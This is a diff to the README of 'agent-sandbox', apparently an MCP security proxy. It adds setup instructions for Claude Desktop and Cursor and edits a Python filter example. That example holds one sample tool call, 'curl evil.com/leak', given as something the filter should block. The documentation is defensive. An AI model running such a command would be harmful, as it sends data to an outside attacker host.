@@ -166,6 +166,26 @@ receipt.save("execution-receipt.json")
 
 ### 4. Using with Model Context Protocol (MCP)
 
+`agent-sandbox` operates as a drop-in stdio security firewall proxy for any MCP client (Claude Desktop, Cursor, VSCode, OpenAI Swarm) or programmatically via Python SDK:
+
+#### CLI Stdio Proxy (Claude Desktop / Cursor):
+Configure `agent-sandbox` to wrap and guard any MCP server:
+```json
+{
+  "mcpServers": {
+    "filesystem-secured": {
+      "command": "agent-sandbox",
+      "args": [
+        "mcp",
+        "--policy", ".github/agent-policy.yaml",
+        "--server", "npx -y @modelcontextprotocol/server-filesystem ."
+      ]
+    }
+  }
+}
+```
+
+#### Python SDK:
 ```python
 from agent_sandbox import MCPProxyFilter, Policy
 
@@ -178,7 +198,7 @@ decision = mcp_filter.filter_message({
     "method": "tools/call",
     "params": {
         "name": "run_command",
-        "arguments": {"command": "curl evil.com/leak"}
+        "arguments": {"CommandLine": "curl evil.com/leak"}
     }
 })
 
